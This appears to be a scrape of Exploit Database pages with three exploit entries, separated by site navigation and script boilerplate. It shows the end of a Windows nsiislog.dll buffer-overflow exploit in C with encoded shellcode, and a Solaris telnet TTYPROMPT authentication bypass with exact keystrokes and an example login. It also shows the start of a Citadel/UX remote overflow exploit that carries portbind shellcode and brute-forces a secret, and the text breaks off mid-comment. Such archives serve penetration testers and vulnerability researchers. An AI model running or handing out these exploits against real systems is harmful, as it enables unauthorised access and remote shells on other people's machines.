xc0\x57\xdf\xc7\xc0\x3a\xc1\x3a\xc1\x68\xc0\x57\xdf""\x27\xd3\x1e\x90\xc0\x68\xc0\x53\xa4\x57\x1c\xd1\x63\x1e\xd0\xab""\x1e\xd0\xd7\x1c\x91\x1e\xd0\xaf\xa4\x57\xf1\x2f\x96\x96\x1e\xd0""\xbb\xc0\xc0\xa4\x57\xc7\xc7\xc7\xd7\xc7\xdf\xc7\xc7\x3a\xc1\xa4""\x57\xc7\x68\xc0\x5f\x68\xe1\x67\x68\xc0\x5b\x68\xe1\x6b\x68\xc0""\x5b\xdf\xc7\xc7\xc4\x68\xc0\x63\x1c\x4f\xa4\x57\x23\x93\xc7\x56""\x7f\x93\xc7\x68\xc0\x43\x1c\x67\xa4\x57\x1c\x5f\x22\x93\xc7\xc7""\xc0\xc6\xc1\x68\xe0\x3f\x68\xc0\x47\x14\xa8\x96\xeb\xb5\xa4\x57""\xc7\xc0\x68\xa0\xc1\x68\xe0\x3f\x68\xc0\x4b\x9c\x57\xe3\xb8\xa4""\x57\xc7\x68\xa0\xc1\xc4\x68\xc0\x6f\xfd\xc7\x68\xc0\x77\x7c\x5f"//¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?SHELLCODE¿?¿?¿?¿?¿?   \xc0\x6b\xa4\x5e\xc6\xc7¿?//¿?WRITEFILE¿?¿?¿?2¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?"\xa4\x57\xc7\x23\x93\xc7\xc1\xc4\x68\xc0\x6b\xa4\x5e\xc6\xc0\xc7""\xc1\x68\xe0\x3b\x68\xc0\x4f\xfd\xc7\x68\xc0\x77\x7c\x3d\xc7\x68""\xc0\x73\x7c\x69\xcf\xc7\x1e\xd5\x65\x54\x1c\xd3\xb3\x9b\x92\x2f""\x97\x97\x97\x50\x97\xef\xc1\xa3\x85\xa4\x57\x54\x7c\x7b\x7f\x75""\x6a\x68\x68\x7f\x05\x69\x68\x68\xdc\xc1\x70\xe0\xb4\x17\x70\xe0""\xdb\xf8\xf6\xf3\xdb\xfe\xf5\xe5\xf6\xe5\xee\xd6\x97\xdc\xd2\xc5""\xd9\xd2\xdb\xa4\xa5\x97\xd4\xe5\xf2\xf6\xe3\xf2\xc7\xfe\xe7\xf2""\x97\xd0\xf2\xe3\xc4\xe3\xf6\xe5\xe3\xe2\xe7\xde\xf9\xf1\xf8\xd6""\x97\xd4\xe5\xf2\xf6\xe3\xf2\xc7\xe5\xf8\xf4\xf2\xe4\xe4\xd6\x97""\xd4\xfb\xf8\xe4\xf2\xdf\xf6\xf9\xf3\xfb\xf2\x97\xc7\xf2\xf2\xfc""\xd9\xf6\xfa\xf2\xf3\xc7\xfe\xe7\xf2\x97\xd0\xfb\xf8\xf5\xf6\xfb""\xd6\xfb\xfb\xf8\xf4\x97\xc0\xe5\xfe\xe3\xf2\xd1\xfe\xfb\xf2\x97""\xc5\xf2\xf6\xf3\xd1\xfe\xfb\xf2\x97\xc4\xfb\xf2\xf2\xe7\x97\xd2""\xef\xfe\xe3\xc7\xe5\xf8\xf4\xf2\xe4\xe4\x97\x97\xc0\xc4\xd8\xd4""\xdc\xa4\xa5\x97\xe4\xf8\xf4\xfc\xf2\xe3\x97\xf5\xfe\xf9\xf3\x97""\xfb\xfe\xe4\xe3\xf2\xf9\x97\xf6\xf4\xf4\xf2\xe7\xe3\x97\xe4\xf2""\xf9\xf3\x97\xe5\xf2\xf4\xe1\x97\x95\x97\x89\xfb\x97\x97\x97\x97""\x97\x97\x97\x97\x97\x97\x97\x97\xf4\xfa\xf3\xb9\xf2\xef\xf2\x97""\x68\x68\x68\x68";void main (int argc, char **argv){WSADATA WSAData;SOCKET s;SOCKADDR_IN addr_in;unsigned char buf[1000];unsigned char testbuf[0x10000];int len;char t1[]="POST /scripts/nsiislog.dll HTTP/1.1\r\nHost: 192.168.10.210\r\nContent-length: 65536\r\n\r\n";//4364if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){printf("WSAStartup error.Error:%d\n",WSAGetLastError());return;}hostName = argv[1];addr_in.sin_family=AF_INET;addr_in.sin_port=htons(80);addr_in.sin_addr.S_un.S_addr=inet_addr(hostName);memset(testbuf,0,0x10000);if ((s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET){printf("Socket failed.Error:%d\n",WSAGetLastError());return;}if(WSAConnect(s,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR){printf("Connect failed.Error:%d",WSAGetLastError());return;}len=sizeof(t1)-1;memcpy(testbuf,t1,len);send(s,testbuf,len,0);recv(s,buf,1000,0);memset(testbuf,'A',65536);//4364len=65536;//4364;*(DWORD *)(testbuf+0x2704)=0x04eb06eb;//jmp¿?¿?¿?¿?¿?¿?¿?¿?*(DWORD *)(testbuf+0x2708)=0x40F0135c;//¿?¿?¿?¿?¿?¿?¿?¿?memcpy(testbuf+0x270c,shellcode,sizeof(shellcode));send(s,testbuf,len,0);closesocket (s);WSACleanup();return;}// milw0rm.com [2003-07-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 57
Solaris 2.6/7/8 - 'TTYPROMPT in.telnet' Remote Authentication Bypass - Solaris remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSolaris 2.6/7/8 - 'TTYPROMPT in.telnet' Remote Authentication BypassEDB-ID:57CVE:2001-0797EDB Verified:Author:Jonathan S.Type:remoteExploit:/Platform:SolarisDate:2002-11-02Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIEDSolaris TTYPROMPT Security Vulnerability (Telnet)This vulnerability is very simple to exploit, since it does not requireany code to be compiled by an attacker. The vulnerability only requiresthe attacker to simply define the environment variable TTYPROMPT to a6-character string, inside telnet. Jonathan believes this overflows aninteger inside login, which specifies whether the user has beenauthenticated (just a guess).Once connected to the remote host, you must type the username, followedby 64 " c"s, and a literal "\n". You will then be logged in as the userwithout any password authentication. This should work with any accountexcept root (unless remote root login is allowed).Example:coma% telnettelnet> environ define TTYPROMPT abcdeftelnet> o localhostSunOS 5.8bin c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\nLast login: whenever$ whoami bin# milw0rm.com [2002-11-02]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 58
Citadel/UX BBS 6.07 - Remote Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCitadel/UX BBS 6.07 - Remote OverflowEDB-ID:58CVE:EDB Verified:Author:Carl LivittType:remoteExploit:/Platform:LinuxDate:2003-07-17Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Citadel/UX 6.07 Remote exploitBy Carl Livitt, July 2003*/#include <sys/types.h>#include <sys/stat.h>#include <sys/socket.h>#include <net/if.h>#include <netinet/in.h>#include <netinet/tcp.h>#include <arpa/inet.h>#include <stdio.h>#include <string.h>#include <unistd.h>#include <signal.h>#include <netdb.h>#include <time.h>#include <stdarg.h>// If you change these, things will probably break.#define SIZ 4096#define LEN 298#define RET 0xbfffaf20#define CITADEL_PORT 504#define SHELL_PORT 45295#define LOCAL_NET()	if(localNet) {my_sleep(nanoSecondsToSleep);}#define CHANCE_COUNTER 5#define NODELAY_ERR -1#define SOCKET_ERR -2#define CONNECT_ERR -3#define HOST_NOT_RESOLVED -4#define BRUTE_FORCE_EXHAUSTED -5#define INCORRECT_IPGM_SECRET -6#define SHELL_NOT_FOUND -7#define SUCCESS 1#define FAILED 0// I'm using prewritten shellcode today... Laziness, Impatience, Hubris!// --------// linux x86 shellcode by eSDee of Netric (www.netric.org)// 200 byte - forking portbind shellcode - port=0xb0ef(45295)char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x51\xb1""\x06\x51\xb1\x01\x51\xb1\x02\x51""\x89\xe1\xb3\x01\xb0\x66\xcd\x80""\x89\xc1\x31\xc0\x31\xdb\x50\x50""\x50\x66\x68\xb0\xef\xb3\x02\x66""\x53\x89\xe2\xb3\x10\x53\xb3\x02""\x52\x51\x89\xca\x89\xe1\xb0\x66""\xcd\x80\x31\xdb\x39\xc3\x74\x05""\x31\xc0\x40\xcd\x80\x31\xc0\x50""\x52\x89\xe1\xb3\x04\xb0\x66\xcd""\x80\x89\xd7\x31\xc0\x31\xdb\x31""\xc9\xb3\x11\xb1\x01\xb0\x30\xcd""\x80\x31\xc0\x31\xdb\x50\x50\x57""\x89\xe1\xb3\x05\xb0\x66\xcd\x80""\x89\xc6\x31\xc0\x31\xdb\xb0\x02""\xcd\x80\x39\xc3\x75\x40\x31\xc0""\x89\xfb\xb0\x06\xcd\x80\x31\xc0""\x31\xc9\x89\xf3\xb0\x3f\xcd\x80""\x31\xc0\x41\xb0\x3f\xcd\x80\x31""\xc0\x41\xb0\x3f\xcd\x80\x31\xc0""\x50\x68\x2f\x2f\x73\x68\x68\x2f""\x62\x69\x6e\x89\xe3\x8b\x54\x24""\x08\x50\x53\x89\xe1\xb0\x0b\xcd""\x80\x31\xc0\x40\xcd\x80\x31\xc0""\x89\xf3\xb0\x06\xcd\x80\xeb\x99";// These kind of appeared as the exploit was developedvoid my_send(int, char *, ...);void my_recv(int);void make_shellcode(char *);void make_exploitbuf(char *);int brute_force(int);void usage(void);void my_sleep(int);void increase_chances(int,int);int connect_to_host(char *, int);int attempt_exploit(void);// As did these... all global, as they kepy moving// between functions and I grew sick of it...int localNet=0, bufLenAdjust=0;int nanoSecondsToSleep=100000;int SEED_START=10;int SEED_MAX=30000;int NUM_ATTEMPTS=4;int RESPAWN_SLEEP=10;int seed;struct timespec t;unsigned long retAddr=RET;char buf[SIZ], host[SIZ];int magicNumber=0,sock,adjustRet=0,ch,retVal,i,r;fd_set rfds;main(int argc, char **argv) {int exploitAttempts=0;// parse command-linewhile((ch=getopt(argc, argv, "t:li:s:hr:a:A:o:O:b:B:n:S:"))!=-1) {switch(ch) {case 't':strncpy(host, optarg, SIZ-1);break;case 'i':magicNumber=atoi(optarg);printf("[-] Using IPGM secret: %d\n", magicNumber);break;case 'l':localNet=1;printf("[-] Using local net hack\n");break;case 's':nanoSecondsToSleep=atoi(optarg);printf("[-] Using sleep count of %d where necessary\n", nanoSecondsToSleep);break;case 'r':retAddr=strtoul(optarg,NULL,16);printf("[-] Using RET address: 0x%08x\n", retAddr);break;case 'a':adjustRet=atoi(optarg);retAddr+=adjustRet;printf("[-] Using RET address: 0x%08x\n", retAddr);break;case 'A':adjustRet=atoi(optarg);retAddr-=adjustRet;printf("[-] Using RET address: 0x%08x\n", retAddr);break;case 'o':bufLenAdjust=atoi(optarg);printf("[-] Increasing overflow buffer by %d bytes\n", bufLenAdjust);break;case 'O':bufLenAdjust=atoi(optarg);bufLenAdjust=-bufLenAdjust;printf("[-] Decreasing overflow buffer by %d bytes\n", bufLenAdjust);break;case 'b':SEED_START=atoi(optarg);printf("[-] Bruteforce starting at srand(%d)\n", SEED_START);break;case 'B':SEED_MAX=atoi(optarg);printf("[-] Bruteforce ending at srand(%d)\n", SEED_MAX);break;case 'n':NUM_ATTEMPTS=atoi(optarg);printf("[-] Will try exploit %d times\n", NUM_ATTEMPTS);break;case 'S':RESPAWN_SLEEP=atoi(optarg);printf("[-] Will sleep for %d seconds between exploit attempts\n");break;case 'h':default:usage();exit(0);}}while(exploitAttempts++ < NUM_ATTEMPTS && (retVal=attempt_exploit())!=SUCCESS) {switch(retVal) {case HOST_NOT_RESOLVED:printf("[*] Couldn't connect to host: %s not found.\n", host);exit(1);break;case SOCKET_ERR:printf("[*] Couldn't grab a socket!\n");exit(1);break;case CONNECT_ERR:printf("[*] Connection to %s was rejected\n",host);exit(1);case NODELAY_ERR:printf("[!] WARNING: Failed to set TCP_NODELAY option on socket\n");break;case BRUTE_FORCE_EXHAUSTED:printf("[*] Brute force operation failed. Aborting.\n");exit(1);break;case INCORRECT_IPGM_SECRET:printf("[*] IPGM secret incorrect!\n");exit(1);break;case SHELL_NOT_FOUND:printf("[!] This attempt failed... waiting for INIT to respawn Citadel...\n");sleep(RESPAWN_SLEEP);break;default:printf("[*] ERROR: There was no error!\n");break;}}if(exploitAttempts==NUM_ATTEMPTS)printf("[-] Exploit failed %d times. Aborting.\n", exploitAttempts);printf("\nHave a nice day!\n");exit(0);}int attempt_exploit(void) {int magic;// Connect to the host and grab the bannerprintf("[-] Connecting to Citadel server (%s) on port %d\n", host, CITADEL_PORT);if((sock=connect_to_host(host,CITADEL_PORT)) < 1)return sock;my_recv(sock);// Attempt to brute-force the secret IPGM authentication number.// Only do this if magic number is not given on command-line (-i flag).magic=magicNumber;if(!magic) {printf("[-] Starting bruteforce operation ...\n");fflush(stdout);if((magic=brute_force(sock))==-1) {return BRUTE_FORCE_EXHAUSTED;}printf("[-] Success! IPGM=%d (seed: %d)\n", magic, seed);magicNumber=magic; // set magicNumber so we don't run bruteforcer again// Tear down the socket, and reconnect again (to reauthenticate),printf("[-] Re-establishing connection to %s ...\n",host);my_send(sock, "QUIT\n");my_recv(sock);close(sock);if(!(sock=connect_to_host(host,CITADEL_PORT)))return sock;}// Authenticate as internal program, but unlike the brute-force attempts,// tag 4K of shellcode on the end of the requestprintf("[-] Authenticating as internal progam ...\n");make_shellcode(buf);my_send(sock, "IPGM %d %s\n", magic, buf);LOCAL_NET();buf[recv(sock,buf,SIZ-1,0)]=0; // don't do this at home, kids!if(strncmp(buf, "200",3)) {return INCORRECT_IPGM_SECRET;}// Increase the chance of the shellcode being in the correct place at the// correct time by sending it many times... this 